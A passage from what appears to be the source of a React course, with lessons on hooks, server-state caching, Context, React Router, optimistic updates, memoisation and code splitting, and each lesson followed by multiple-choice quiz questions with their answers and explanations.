React compares snapshots with \`Object.is\`, so it sees a change every time, re-renders, reads again, and loops — with a warning that the result of getSnapshot should be cached. Return a primitive, or cache the object and replace it only when the underlying value really changes. Keep \`subscribe\` at module scope too, or every render tears down and rebuilds the subscription.

### useImperativeHandle: a narrow remote control

Some operations are genuinely imperative: play a video, focus a field, scroll a row into view.

\`\`\`jsx
const VideoPlayer = forwardRef(function VideoPlayer({ src }, ref) {
  const el = useRef(null);

  useImperativeHandle(ref, () => ({
    play: () => el.current.play(),
    pause: () => el.current.pause(),
    seek: (seconds) => { el.current.currentTime = seconds; },
  }), []);

  return <video ref={el} src={src} />;
});

// Parent: playerRef.current.seek(30);
\`\`\`

Expose verbs, never the node itself and never your state. Returning \`el.current\` lets any parent restyle your internals and freezes today's DOM structure into your public API. And when you catch yourself adding a fourth method to keep parent and child in step, the relationship is data rather than commands — pass a prop.

| Hook | Solves |
|---|---|
| \`useId\` | Stable, SSR-safe ids for label and ARIA wiring |
| \`useSyncExternalStore\` | Reading a mutable source outside React without tearing |
| \`useImperativeHandle\` | Exposing a small imperative API from a component |
| \`useDebugValue\` | Labelling a custom hook in the DevTools panel |
        `,
        [
          q('Why generate field ids with useId instead of a module-level counter?', [
            'useId is faster than incrementing a number',
            'It produces ids that are stable across renders and identical on server and client, so ARIA wiring and hydration both hold',
            'Counters are not allowed in ES modules',
            'useId also renders the label element for you',
          ], 1, 'A counter restarts in the browser and a random id changes every render, and both break the association between a label, its input and its error message.'),
          q('getSnapshot is written as () => ({ online: navigator.onLine }). What happens?', [
            'It works correctly, because the object is shallow',
            'The store is read only once, on mount',
            'The subscribe callback is never registered',
            'React loops and warns that the snapshot should be cached, because a new object fails every identity check',
          ], 3, 'Snapshots are compared with Object.is, so returning a fresh object reports a change on every read and the component re-renders forever.'),
          q('What should a useImperativeHandle expose to the parent?', [
            'A narrow set of verbs such as play() and focus(), never the DOM node or internal state',
            'The component state setters, so the parent can drive it',
            'The raw ref object it was given',
            'Everything the parent might plausibly need, to avoid a second release',
          ], 0, 'A small verb-only surface keeps the internals replaceable; handing back the node makes the current DOM structure part of your public contract.'),
        ]
      ),
      ],
      [
        q('Calling setCount(count + 1) three times in one handler increments by 1. Why?', [
          'React throttles rapid updates',
          'All three read the same render snapshot of count, so the last write wins',
          'Only the first setter call is registered',
          'count is a const and cannot change',
        ], 1, 'Each render captures its own count; the updater form setCount(c => c + 1) receives the pending value instead.'),
        q('Switching quickly between two detail pages shows the wrong data. Most likely cause?', [
          'The dependency array is missing a value',
          'The component is not memoised',
          'React batches the two fetches',
          'No cleanup, so a slower earlier response resolves last and overwrites the newer one',
        ], 3, 'Without aborting or flagging the previous request, response order is not guaranteed and stale data wins.'),
        q('You store a setInterval id so you can clear it later. Where does it belong?', [
          'useRef, because nothing on screen depends on it',
          'useState, so the component re-renders',
          'A module-level variable',
          'Context, so children can clear it',
        ], 0, 'Refs hold mutable values across renders without triggering one — ideal for values the UI never displays.'),
        q('Why must hooks never be called conditionally?', [
          'Conditions make them slower',
          'JSX cannot contain conditions',
          'React identifies hooks by call order, so a skipped call shifts every later hook',
          'It breaks server rendering only',
        ], 2, 'Hook state is stored as an ordered list per component; changing the order maps values onto the wrong hooks.'),
      ]
    ),
    chapter(
      'State Management and Routing',
      'Choosing where state lives at application scale, and wiring the URL to your component tree.',
      [
        lesson('Client State vs Server State', 13, `
"Which state library should we use?" is the wrong first question. The right one is: **is this state yours, or is it a copy of something on a server?**

| | Client state | Server state |
|---|---|---|
| Owner | This browser tab | The database |
| Truth | Always correct | A cache that can go stale |
| Examples | Open modal, active tab, draft text | Course list, profile, order history |
| Needs | Nothing special | Caching, deduping, revalidation, retries |

Almost every "we need Redux" conversation is really about server state, and server state is a caching problem, not a state-container problem.

### What hand-rolled fetching quietly lacks

\`\`\`jsx
function CourseList() {
  const [courses, setCourses] = useState([]);
  const [status, setStatus] = useState('loading');

  useEffect(() => {
    let cancelled = false;
    fetch('/api/courses')
      .then(r => r.json())
      .then(d => { if (!cancelled) { setCourses(d.data); setStatus('ready'); } })
      .catch(() => { if (!cancelled) setStatus('error'); });
    return () => { cancelled = true; };
  }, []);
  // ...
}
\`\`\`

This is correct, and still missing: a cache (navigate away and back, you refetch and flash a spinner), deduplication (three components mounting together fire three identical requests), background revalidation, retry on failure, and any way to tell every screen that the list changed after a mutation.

### A query cache does all of that

\`\`\`jsx
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query';

function useCourses() {
  return useQuery({
    queryKey: ['courses'],
    queryFn: async () => {
      const res = await fetch('/api/courses');
      if (!res.ok) throw new Error('Failed to load courses');
      const body = await res.json();
      return body.data;   // same { data: [...] } envelope as the version above
    },
    staleTime: 60_000,   // trust the cache for a minute before revalidating
  });
}

function CourseList() {
  const { data, isPending, isError, error } = useCourses();
  if (isPending) return <Spinner />;
  if (isError) return <ErrorNote message={error.message} />;
  return <ul>{data.map(c => <li key={c.id}>{c.title}</li>)}</ul>;
}
\`\`\`

The **query key** is the cache identity. Anything the request depends on goes in it — \`['course', slug]\`, \`['courses', { level, page }]\` — so changing a filter is just a different key, and the old data stays cached for the back button.

Mutations tell the cache what became untrue:

\`\`\`jsx
const qc = useQueryClient();
const enrol = useMutation({
  mutationFn: async (id) => {
    const res = await fetch(\`/api/courses/\${id}/enrol\`, { method: 'POST' });
    // fetch does not reject on 4xx/5xx — without this, onSuccess fires on failure
    if (!res.ok) throw new Error('Enrolment failed');
  },
  onSuccess: () => qc.invalidateQueries({ queryKey: ['courses'] }),
});
\`\`\`

\`invalidateQueries\` marks the entry stale and refetches wherever it is on screen. Manually calling \`setCourses\` in five components is the alternative, and it is how UIs get out of sync.

### What is left for a client store

Once server data moves to a query cache, the genuinely global client state in a typical app is small: theme, auth session, a shopping cart, maybe a wizard in progress. That fits in Context (next lesson) or a small store like Zustand:

\`\`\`jsx
import { create } from 'zustand';

export const useCart = create((set) => ({
  items: [],
  add: (item) => set(s => ({ items: [...s.items, item] })),
  clear: () => set({ items: [] }),
}));

const count = useCart(s => s.items.length);   // subscribes to the count only
\`\`\`

The selector matters: this component re-renders when the count changes, not when an unrelated field does.

### The decision, in order

1. Can it be computed during render? Then it is not state (Chapter 1).
2. Does it come from a server? Query cache.
3. Does it describe the current view and deserve to be shareable? URL.
4. Is it used by one subtree? \`useState\` there.
5. Only what survives all four is a candidate for a global store.

Following that order, most applications never need a general-purpose state library at all.
        `,
        [
          q('The hand-rolled fetch with a cancelled flag is correct code. What is it still missing?', [
            'A loading state',
            'Any error handling',
            'Cancellation when the component unmounts',
            'A cache, request deduplication, background revalidation and retries',
          ], 3, 'Correctness is not the same as caching: without those four, every mount refetches, three mounts fire three identical requests, and nothing revalidates.'),
          q('A list is filtered by level and paged. What belongs in the query key?', [
            'Only the endpoint name, since filters are a UI concern',
            'A hash of the response body, so stale data is detected',
            'Everything the request depends on, so a different filter is simply a different cache entry',
            'A timestamp, so the entry expires on its own',
          ], 2, 'The query key is the cache identity, and keying by inputs means switching filters reads or fills a separate entry while the old one stays warm for the back button.'),
          q('Why does the enrol mutation check if (!res.ok) throw before returning?', [
            'To make the request retry automatically',
            'Because fetch only rejects on network failure, so without it onSuccess would run after a 500',
            'To let the nearest error boundary render instead',
            'Because invalidateQueries requires a thrown error to work',
          ], 1, 'A 4xx or 5xx response is still a fulfilled promise, so the mutation must convert it into a rejection itself.'),
        ]
      ),
        lesson('Context Without the Re-render Tax', 13, `
Context solves exactly one problem: passing a value to a deep descendant without threading it through every component in between. It is a **transport mechanism, not a state manager**, and treating it as the latter is how applications end up re-rendering everything on every keystroke.

### The shape that works

\`\`\`jsx
const ThemeContext = createContext(null);

export function ThemeProvider({ children }) {
  const [theme, setTheme] = useState('light');

  const value = useMemo(
    () => ({ theme, toggle: () => setTheme(t => (t === 'light' ? 'dark' : 'light')) }),
    [theme]
  );

  return <ThemeContext.Provider value={value}>{children}</ThemeContext.Provider>;
}

export function useTheme() {
  const ctx = useContext(ThemeContext);
  if (!ctx) throw new Error('useTheme must be used inside a ThemeProvider');
  return ctx;
}
\`\`\`

Two details earn their place. The custom hook turns a forgotten provider into a clear error instead of \`Cannot read properties of null\`. And \`useMemo\` around the value is not an optimisation here — it is a correctness fix for the bug below.

### The classic bug: a fresh object every render

\`\`\`jsx
<AuthContext.Provider value={{ user, login, logout }}>
\`\`\`

That object literal is a **new reference on every render of the provider**. Context consumers are notified when the value fails an \`Object.is\` comparison, so every consumer in the tree re-renders whenever the provider re-renders — even consumers that only read \`logout\`, which never changed. \`React.memo\` on the children does not help: context propagates straight through memo boundaries.

Symptom in the wild: an app-wide provider holds a search string, and typing in the header re-renders a 400-row table on every character.

### Split by change frequency

A value that changes often and a value that never changes should not share a context.

\`\`\`jsx
const CartStateContext = createContext(null);
const CartDispatchContext = createContext(null);

export function CartProvider({ children }) {
  const [state, dispatch] = useReducer(cartReducer, initialCart);
  return (
    <CartDispatchContext.Provider value={dispatch}>
      <CartStateContext.Provider value={state}>
        {children}
      </CartStateContext.Provider>
    </CartDispatchContext.Provider>
  );
}
\`\`\`

\`dispatch\` from \`useReducer\` is identity-stable forever, so a component that only dispatches — an "Add to cart" button — never re-renders when the cart changes. No memoisation required.

### Keep the provider from re-rendering at all

\`\`\`jsx
// BAD: the tree is created inside the provider's own render, so every
// theme change re-renders ExpensiveTree along with the provider.
function Provider() {
  const [theme, setTheme] = useState('light');
  return (
    <ThemeContext.Provider value={theme}>
      <ExpensiveTree />
    </ThemeContext.Provider>
  );
}

// GOOD: the tree arrives as a prop, created by the parent.
function Provider({ children }) {
  const [theme, setTheme] = useState('light');
  return <ThemeContext.Provider value={theme}>{children}</ThemeContext.Provider>;
}

<Provider><ExpensiveTree /></Provider>
\`\`\`

In the second version the \`<ExpensiveTree />\` element object is built by the *parent*, which did not re-render, so React receives the identical element it saw last time and bails out of re-rendering that subtree. Provider state changes then re-render only the consumers, not the children. This is the "pass children as props" trick, and it is worth understanding before reaching for memo.

### Prop drilling is not automatically a problem

Two or three levels of explicit props are readable and greppable. Context trades that for indirection: a component's data source is no longer visible at the call site, and it can no longer be rendered in isolation without a provider — which makes tests (Chapter 5) heavier. Use context for things that are genuinely ambient: theme, current user, locale, a design-system config. Use props for everything else.
        `,
        [
          q('Why does useTheme throw when the context value is null instead of just returning it?', [
            'Context values are not allowed to be null in React',
            'Every context must declare a default value',
            'A missing provider becomes a named error instead of a null property crash deep inside a child',
            'Throwing is what subscribes the component to updates',
          ], 2, 'The guard converts a confusing runtime crash far from its cause into a message naming the provider you forgot to render.'),
          q('Why does passing {children} into the provider keep ExpensiveTree from re-rendering when the theme changes?', [
            'Children are rendered lazily by React',
            'React.memo is applied to children automatically',
            'React skips every subtree below a provider',
            'The element object is created by the parent, which did not re-render, so React sees the identical element and bails out',
          ], 3, 'A component only re-renders children it creates; an element passed in as a prop is the same object as last time, so React reuses the previous output.'),
          q('When is prop drilling the better choice?', [
            'Never, because context is always cheaper',
            'For two or three explicit levels, which stay greppable and keep the component renderable in a test without a provider',
            'Only for primitive values such as strings and numbers',
            'Only when the value never changes after mount',
          ], 1, 'Context trades visibility for convenience, and at short depths the explicit prop is easier to read and easier to test.'),
        ]
      ),
        lesson('Routing with React Router', 14, `
A single-page app has to answer two questions: what does this URL render, and how do I move between URLs without a full page load? React Router answers both, and the URL becomes the state container Chapter 1 recommended.

### Nested routes describe nested layouts

\`\`\`jsx
import { createBrowserRouter, RouterProvider, Outlet, NavLink } from 'react-router-dom';

function AppLayout() {
  return (
    <>
      <nav>
        <NavLink to="/courses" className={({ isActive }) => isActive ? 'on' : ''}>
          Courses
        </NavLink>
      </nav>
      <main><Outlet /></main>   {/* the matched child route renders here */}
    </>
  );
}

const router = createBrowserRouter([
  {
    path: '/',
    element: <AppLayout />,
    errorElement: <ErrorPage />,
    children: [
      { index: true, element: <Home /> },
      { path: 'courses', element: <CourseList /> },
      { path: 'courses/:slug', element: <CourseDetail /> },
      { path: '*', element: <NotFound /> },
    ],
  },
]);

<RouterProvider router={router} />;
\`\`\`

\`<Outlet />\` is the slot pattern from Chapter 1 applied to routing: the layout stays mounted while children swap, so the nav does not remount and scroll position in a sidebar is preserved.

### Reading and changing the URL

\`\`\`jsx
const { slug } = useParams();                    // /courses/react-basics
const [params, setParams] = useSearchParams();   // ?page=2&level=beginner
const navigate = useNavigate();
const location = useLocation();

navigate('/courses');                             // push
navigate('/login', { replace: true, state: { from: location } });
\`\`\`

Route params are strings, always. \`Number(params.get('page') ?? 1)\` — forgetting that conversion produces \`"2" + 1 === "21"\`, a bug that only appears on page two.

### Link, not anchor

\`\`\`jsx
<a href="/courses">Courses</a>       {/* full page reload: state lost, slow */}
<Link to="/courses">Courses</Link>   {/* client-side navigation */}
\`\`\`

\`<Link>\` still renders a real \`<a>\` with an \`href\`, so middle-click, right-click "open in new tab", and screen readers all work. Never simulate navigation with a \`div\` and \`onClick\` — that is the accessibility failure from Chapter 5, and it costs you every browser affordance.

### Protecting routes

\`\`\`jsx
function RequireAuth({ children }) {
  const { user, isLoading } = useAuth();
  const location = useLocation();

  if (isLoading) return <Spinner />;               // do not redirect while unknown
  if (!user) return <Navigate to="/login" replace state={{ from: location }} />;
  return children;
}

{ path: 'dashboard', element: <RequireAuth><Dashboard /></RequireAuth> }
\`\`\`

The \`isLoading\` branch is the part people skip: without it, a refresh on a protected page bounces the user to \`/login\` for a moment before the session resolves. And \`replace\` keeps the login page out of the history stack, so back does not return to it. Client-side guards are UX only — the server must still authorise every request.

### Split the bundle at the route boundary

\`\`\`jsx
import { lazy, Suspense } from 'react';
const Analytics = lazy(() => import('./routes/Analytics'));

{ path: 'analytics',
  element: <Suspense fallback={<Skeleton />}><Analytics /></Suspense> }
\`\`\`

Routes are the natural split point: a visitor to the home page should not download the charting library used on one admin screen. Chapter 4 covers the measurement side.

### The deployment trap

Hard-refreshing \`/courses/react-basics\` sends a real request to your server for a path that has no file. Static hosts return 404 until you configure a rewrite so every unmatched path serves \`index.html\` — a \`try_files\` rule in nginx, a \`_redirects\` line on Netlify, or the Express catch-all registered *after* the API routes. Everything works in development, then breaks on the first shared link. Check it before launch, not after.
        `,
        [
          q('What does <Outlet /> do inside a layout route?', [
            'Renders the matched child route in place, so the layout stays mounted while children swap',
            'Redirects to the index route when no child matches',
            'Renders the error element for the branch',
            'Exposes the router instance to the rest of the tree',
          ], 0, 'It is the slot pattern applied to routing, which is why the nav does not remount and sidebar scroll position survives navigation.'),
          q('const next = params.get("page") + 1 produces "21" on page two. Why?', [
            'useSearchParams returns numbers as strings only in production builds',
            'Search params are always strings, so + concatenates instead of adding',
            'The parameter name does not match the route definition',
            'React Router URL-encodes numeric values',
          ], 1, 'Route and search params are strings without exception, so arithmetic on them needs an explicit Number() conversion.'),
          q('RequireAuth bounces the user to /login for a moment on every refresh of a protected page. What is missing?', [
            'The replace flag on the Navigate element',
            'A server-side authorisation check',
            'An isLoading branch that renders a spinner while the session is still unknown',
            'A Suspense boundary around the protected route',
          ], 2, 'Until the session resolves, user is neither present nor absent, so redirecting on that first render redirects a user who is in fact signed in.'),
        ]
      ),
        lesson('Optimistic Updates and Cache Invalidation', 14, `
A mutation succeeds on the server and the screen is now wrong. Everything fetched before that request is a cache holding pre-mutation truth, and closing that gap is most of the work in a data-heavy UI.

### Three strategies, in increasing order of effort

| Strategy | What the user sees | Cost |
|---|---|---|
| Invalidate and refetch | A stale value for one round trip, then the truth | An extra request |
| Write the response into the cache | Correct immediately after the response | The endpoint must return the updated entity |
| Optimistic update | Correct before the request even leaves | A rollback path you have to write |

Invalidation is the default, and it is usually enough:

\`\`\`jsx
const rename = useMutation({
  mutationFn: ({ id, title }) => api.patch(\`/api/courses/\${id}\`, { title }),
  onSuccess: () => qc.invalidateQueries({ queryKey: ['courses'] }),
});
\`\`\`

\`invalidateQueries\` matches by key **prefix**, so \`['courses']\` also invalidates \`['courses', { level: 'beginner' }]\` and \`['courses', 2]\`. That is exactly what you want after a rename, and it is why keys should read hierarchically: entity first, parameters after. Pass \`exact: true\` when you genuinely mean one entry and no others.

When the endpoint already returns the updated row, skip the refetch:

\`\`\`jsx
onSuccess: (updated) => qc.setQueryData(['course', updated.id], updated),
\`\`\`

### The optimistic version, with the two lines people omit

\`\`\`jsx
const toggleDone = useMutation({
  mutationFn: ({ id, done }) => api.patch(\`/api/tasks/\${id}\`, { done }),

  onMutate: async ({ id, done }) => {
    await qc.cancelQueries({ queryKey: ['tasks'] });          // 1
    const previous = qc.getQueryData(['tasks']);              // 2
    qc.setQueryData(['tasks'], (old) =>
      old.map(t => (t.id === id ? { ...t, done } : t))
    );
    return { previous };                                       // reaches onError as ctx
  },

  onError: (_err, _vars, ctx) => qc.setQueryData(['tasks'], ctx.previous),
  onSettled: () => qc.invalidateQueries({ queryKey: ['tasks'] }),
});
\`\`\`

**(1) \`cancelQueries\`.** A background refetch may already be in flight, carrying data from before the change. If it resolves after your optimistic write it overwrites it, and the checkbox visibly flicks back for half a second until the invalidation corrects it again. It is Chapter 2's out-of-order fetch race wearing cache clothes.

**(2) The snapshot.** Without \`previous\` there is nothing to restore, so a rejected request leaves the optimistic lie on screen permanently. \`onError\` is the only place that can put the old value back.

Note \`onSettled\` rather than \`onSuccess\`: reconciling after both outcomes means even the rollback path finishes on server truth.

### Temporary ids

An optimistically added row has no server id yet:

\`\`\`jsx
const optimistic = { id: \`temp-\${crypto.randomUUID()}\`, title, pending: true };
\`\`\`

Two rules follow. Key the list by that temporary id (Chapter 1) so the row is not remounted and re-animated when the real id arrives, and disable every action that needs a real id — open, delete, share — while \`pending\` is true. A user who clicks through to \`/tasks/temp-8f3a\` gets a 404 that reads as your app losing their work.

### When not to be optimistic

Optimism is a bet that the server will agree. Take the bet for reversible, low-stakes edits: toggles, reordering, renaming, marking notifications read. Refuse it wherever the server can legitimately say no — booking the last seat, spending a credit, applying a coupon that has expired. Withdrawing a confirmation two seconds after showing it is much worse than a 400 ms spinner that then tells the truth.

And never reach for optimism to paper over a slow endpoint. The fix for a three-second PATCH is the endpoint.
        `,
        [
          q('Why does onMutate call cancelQueries before writing to the cache?', [
            'To free the memory the previous entry was using',
            'So a refetch that is already in flight cannot resolve afterwards and overwrite the optimistic value',
            'To guarantee the mutation itself runs only once',
            'To reset the retry counter for that query key',
          ], 1, 'An in-flight request carries pre-mutation data, and if it lands second it clobbers your optimistic write and the UI visibly flips back.'),
          q('onMutate returns { previous } and onError writes it back. Why snapshot the cache at all?', [
            'Without a snapshot there is nothing to restore, so a failed request leaves the optimistic lie on screen',
            'React Query cannot refetch a query after an error',
            'A mutation cannot be retried unless it returns a context object',
            'It is what triggers the rollback animation',
          ], 0, 'The optimistic write destroyed the old value, so the only way back is the copy you took before overwriting it.'),
          q('Which mutation is the worst candidate for an optimistic update?', [
            'Toggling a checkbox on a to-do item',
            'Renaming a folder the user owns',
            'Booking the last remaining seat, which the server may legitimately refuse',
            'Marking a notification as read',
          ], 2, 'Optimism assumes the server will agree, so it is wrong exactly where a refusal is a normal outcome and the rollback would retract a confirmation.'),
        ]
      ),
      ],
      [
        q('Which of these is server state rather than client state?', [
          'The list of courses fetched from an API',
          'Whether a dropdown is open',
          'The current step of a multi-step form',
          'The selected theme',
        ], 0, 'Data owned by a database is a cache in the browser, so it needs staleness, revalidation and invalidation handling.'),
        q('Typing in a header input re-renders a large unrelated table. The provider passes value={{ query, setQuery }}. Why?', [
          'React.memo was not applied to the table',
          'Context values must be primitives',
          'The inline object is a new reference each render, so every context consumer re-renders',
          'The table is missing keys',
        ], 2, 'Consumers compare the context value by identity, and a fresh object literal fails that comparison every render.'),
        q('Why is dispatch from useReducer safe to expose through its own context?', [
          'It is memoised automatically by React.memo',
          'Its identity is stable for the component lifetime, so dispatch-only consumers never re-render',
          'It never changes state',
          'Context ignores function values',
        ], 1, 'A stable reference means the dispatch context value never changes identity, so subscribers to it are not notified.'),
        q('A deployed SPA 404s when a user refreshes /courses/react. What is missing?', [
          'A catch-all route in React Router',
          'HTTPS',
          'A Suspense boundary',
          'A server rewrite serving index.html for unmatched paths',
        ], 3, 'The browser asks the server for that path directly, so the host must fall back to index.html for client-side routing to take over.'),
      ]
    ),
    chapter(
      'Performance',
      'Why React re-renders, what memoisation actually buys, and how to ship less JavaScript and fewer DOM nodes.',
      [
        lesson('Why React Re-renders', 13, `
Before optimising anything, you need an accurate model of when a component runs. There are exactly three triggers:

1. **Its own state changed** — a \`useState\` setter or \`dispatch\` was called with a different value.
2. **Its parent re-rendered** — by default, children re-render when their parent does, regardless of props.
3. **A context it consumes changed** — the provider's value failed an \`Object.is\` check.

Notice what is *not* on the list: props changing. Props changing is a consequence of the parent re-rendering, not an independent cause. And a component whose props are identical still re-renders when its parent does, unless it is wrapped in \`React.memo\`.

### Re-render is not repaint

A re-render calls your function and produces a new element tree. React diffs it against the previous tree and touches the DOM only where they differ. For a component returning twenty elements with unchanged output, the cost is a function call and a diff — measured in microseconds. The expensive things are:

- Rendering **many** components (a 2,000-row table, not a 20-line card).
- Expensive work **inside** render — sorting 10,000 items, parsing markdown, formatting dates in a loop.
- Layout thrash — reading \`getBoundingClientRect\` and writing styles in the same pass.

Optimising a component that renders in 0.1 ms is not free: you add a comparison, a cache entry, and a dependency array that will go stale.

### Measure first, with real numbers

Open React DevTools, go to Profiler, tick "Record why each component rendered", and interact with the slow screen. You get a flamegraph with per-commit durations. Look for the widest bar, not the tallest one — depth is fine, width is time.

For a quick check in code:

\`\`\`jsx
import { Profiler } from 'react';

<Profiler id="ResultsTable" onRender={(id, phase, actualMs) => {
  if (actualMs > 16) console.warn(id, phase, actualMs.toFixed(1) + 'ms');
}}>
  <ResultsTable rows={rows} />
</Profiler>
\`\`\`

**16 ms** is the budget for one frame at 60 fps. Anything longer drops a frame; anything over roughly 100 ms feels like lag to the user. Those two numbers should decide whether you optimise at all.

### Fix the architecture before reaching for memo

Most re-render problems are state living too high. Moving it down is free and permanent, where memoisation is a running cost.

\`\`\`jsx
// BEFORE: every keystroke re-renders the whole page, including the heavy table
function Page() {
  const [query, setQuery] = useState('');
  return (
    <>
      <input value={query} onChange={e => setQuery(e.target.value)} />
      <ExpensiveTable rows={rows} />
    </>
  );
}

// AFTER: the state now lives in the only component that reads it
function SearchBox() {
  const [query, setQuery] = useState('');
  return <input value={query} onChange={e => setQuery(e.target.value)} />;
}

function Page() {
  return <><SearchBox /><ExpensiveTable rows={rows} /></>;
}
\`\`\`

When the state genuinely must stay high — a filter the table also needs — the children-as-props trick from Chapter 3 keeps the untouched subtree out of the re-render.

### Two more sources of avoidable work

**Expensive computation in the render body.** \`rows.filter(...).sort(...)\` on 20,000 items runs on every render, including renders caused by an unrelated toggle. That is the legitimate case for \`useMemo\`, next lesson.

**Uncontrolled render cascades from context.** A single provider holding fast-changing state re-renders every consumer. Split it, as Chapter 3 showed.

The order that works: measure, move state down, cut the number of rendered nodes, and only then memoise what remains.
        `,
        [
          q('The Profiler reports a 22 ms commit. Should you care, and why?', [
            'It is unmeasurable noise and can be ignored',
            'It exceeds the 16 ms frame budget at 60 fps, so that commit drops a frame',
            'It is fine, because only commits over 100 ms matter at all',
            'It means the component rendered 22 separate times',
          ], 1, 'One frame at 60 fps is roughly 16 ms, so anything longer than that cannot be committed without missing a frame.'),
          q('In a Profiler flamegraph, which bar deserves your attention first?', [
            'The widest bar, because width is time and depth is not',
            'The tallest bar, because a deep tree is an expensive tree',
            'The leftmost bar, because it committed first',
            'The bar with the most props listed',
          ], 0, 'The flamegraph encodes duration as width, so a deep but narrow stack is cheap and a wide bar is where the time went.'),
          q('A search input re-renders a heavy table on every keystroke. What does the lesson do before reaching for memoisation?', [
            'Wrap the table in React.memo',
            'Debounce the input by 300 ms',
            'Move the query state down into the component that actually reads it',
            'Virtualise the table rows',
          ], 2, 'Relocating state is free and permanent, whereas memoisation is a running cost plus a dependency array that can go stale.'),
        ]
      ),
        lesson('memo, useMemo, useCallback — and When Not To', 14, `
These three tools all trade memory and complexity for skipped work. They are worth it in specific situations and actively harmful everywhere else.

### React.memo skips a re-render caused by a parent

\`\`\`jsx
const Row = memo(function Row({ item, onSelect }) {
  return <tr onClick={() => onSelect(item.id)}><td>{item.name}</td></tr>;
});
\`\`\`

\`memo\` compares props shallowly with \`Object.is\`. If every prop is identical, React reuses the previous output. It changes nothing about renders caused by the component's own state or context.

### The bug that makes memo useless

\`\`\`jsx
function Table({ items }) {
  return items.map(item => (
    <Row
      key={item.id}
      item={item}
      onSelect={(id) => console.log(id)}      // new function every render
      style={{ padding: 8 }}                  // new object every render
    />
  ));
}
\`\`\`

Both props are new references on every render of \`Table\`, so the shallow compare fails and \`memo\` re-renders all 500 rows anyway — plus the cost of 500 failed comparisons. **A memoised component with an inline function or object prop is a memoised component that never memoises**, and it is the most common wasted optimisation in React codebases.

The fix is to stabilise the props:

\`\`\`jsx
function Table({ items }) {
  const handleSelect = useCallback((id) => { console.log(id); }, []);
  return items.map(item => (
    <Row key={item.id} item={item} onSelect={handleSelect} />
  ));
}
\`\`\`

Move the style object to a CSS class or hoist it to module scope. Constants do not belong inside a render function.

### useMemo caches a value, useCallback caches a function

\`\`\`jsx
// useMemo: skip an expensive computation when its inputs have not changed
const visible = useMemo(
  () => rows.filter(r => r.level === level).sort((a, b) => a.name.localeCompare(b.name)),
  [rows, level]
);

// useCallback(fn, deps) is exactly useMemo(() => fn, deps)
const onSave = useCallback(() => save(draft), [draft]);
\`\`\`

They serve two distinct purposes:

| Purpose | Example |
|---|---|
| Avoid recomputing something genuinely slow | Sorting 20,000 rows, parsing markdown |
| Keep a reference stable for memo, deps, or context | A callback passed to a memoised child |

If neither applies, skip it. \`useMemo(() => a + b, [a, b])\` costs more than the addition: an array allocation, a dependency comparison, and a cache slot, on every render, forever.

### The stale-closure trap

\`\`\`jsx
const submit = useCallback(() => {
  postForm(values);        // captures values from the render it was created in
}, []);                    // empty deps: values is frozen at mount
\`\`\`

Emptying the deps array to "make it stable" freezes every value the function reads. The form submits whatever was on screen at mount. Use the updater form of setters, keep changing values in a ref (Chapter 2), or accept the honest dependency.

### A decision rule you can apply in review

Reach for memoisation when **all** of these hold:

1. You measured a real problem — a commit over 16 ms, or a visible jank.
2. The component renders often, with a heavy subtree or a long list.
3. The props can actually be made stable.

Otherwise leave it out. Every \`useMemo\` is a dependency array that can go stale, and a wrong dependency array produces a bug that is much harder to find than a slow render.

### One note on the future

The React Compiler memoises components and values automatically at build time, based on real data flow rather than hand-written dependency arrays. Where it is enabled, most manual \`useMemo\` and \`useCallback\` becomes redundant. Write code that is correct first; the compiler cannot fix a stale closure you introduced to chase a phantom render.
        `,
        [
          q('Which re-render does React.memo NOT prevent?', [
            'A parent re-rendering and passing exactly the same props',
            'A state update inside the memoised component itself',
            'A parent re-rendering because a grandparent did, with identical props passed down',
            'A parent re-rendering while the memoised child receives no props at all',
          ], 1, "memo intercepts only the parent-driven path, so the component's own state updates and its context updates go straight through it."),
          q('const submit = useCallback(() => postForm(values), []) posts the values as they were at mount. What went wrong?', [
            'useCallback cannot wrap a function that performs async work',
            'postForm must be memoised as well',
            'The empty dependency array freezes every value the function closes over',
            'The callback needs to be declared outside the component',
          ], 2, 'Emptying the deps to buy a stable identity also pins the closure to the render that created it, which is the stale-closure trap.'),
          q('useCallback(fn, deps) is exactly equivalent to which call?', [
            'useMemo(() => fn, deps)',
            'useRef(fn)',
            'memo(fn)',
            'useEffect(() => fn, deps)',
          ], 0, 'useCallback is useMemo that returns the function itself rather than the result of calling it.'),
        ]
      ),
        lesson('Code Splitting and List Virtualisation', 14, `
Two of the biggest wins in frontend performance are not about React at all: **ship less JavaScript**, and **render fewer DOM nodes**.

### Splitting the bundle

Every kilobyte in the initial bundle must be downloaded, parsed, and executed before the page is interactive. Parsing is the expensive part on a mid-range phone — roughly 1 MB of JavaScript costs about a second of CPU time before anything renders.

\`\`\`jsx
import { lazy, Suspense } from 'react';

const RichTextEditor = lazy(() => import('./RichTextEditor'));

function Notes({ editing }) {
  return editing
    ? <Suspense fallback={<EditorSkeleton />}><RichTextEditor /></Suspense>
    : <NotePreview />;
}
\`\`\`

\`lazy\` takes a function returning a dynamic \`import()\`, and the bundler emits a separate chunk fetched on first render. Wrap it in \`Suspense\` or React throws.

Where to split, in order of value:

1. **Routes** — the default split point (Chapter 3). No one should download the admin dashboard to read the home page.
2. **Heavy dependencies behind interaction** — editors, charts, PDF viewers, map libraries. A 300 KB charting library loaded only when a user opens the analytics tab.
3. **Below-the-fold widgets** — rarely worth it on its own.

Do not split small components. Each chunk is another request and another loading state; splitting a 4 KB modal makes the app slower and blinkier.

Run \`npx vite-bundle-visualizer\` (or \`source-map-explorer\` for CRA) before you guess. The usual finding is one accidental import — a whole date library imported for one \`format\` call, or an icon set imported as \`import * as Icons\`.

Preload on intent, so the chunk is warm before the click:

\`\`\`jsx
<Link to="/analytics" onMouseEnter={() => import('./routes/Analytics')}>
  Analytics
</Link>
\`\`\`

### Virtualisation: render the window, not the list

A 5,000-row table is 5,000 \`<tr>\` elements plus their children — easily 30,000 DOM nodes. The browser must lay out and paint all of them, memory climbs, and every re-render diffs the whole tree. Scrolling stutters badly on anything below a desktop.

Virtualisation renders only the rows inside the viewport plus a small overscan buffer, and positions them with a spacer of the full height so the scrollbar stays honest.

\`\`\`jsx
import { FixedSizeList } from 'react-window';

// Hoisted, for the reason Chapter 1 gave: a Row declared inside StudentList
// would be a new component type on every render, remounting every visible row.
// style carries the absolute positioning — always spread it onto the node.
const Row = ({ index, style, data }) => (
  <div style={style} className="row">{data[index].name}</div>
);

function StudentList({ students }) {
  return (
    <FixedSizeList
      height={600}          // visible height in px
      itemCount={students.length}
      itemData={students}   // reaches Row as its data prop
      itemSize={48}         // row height in px
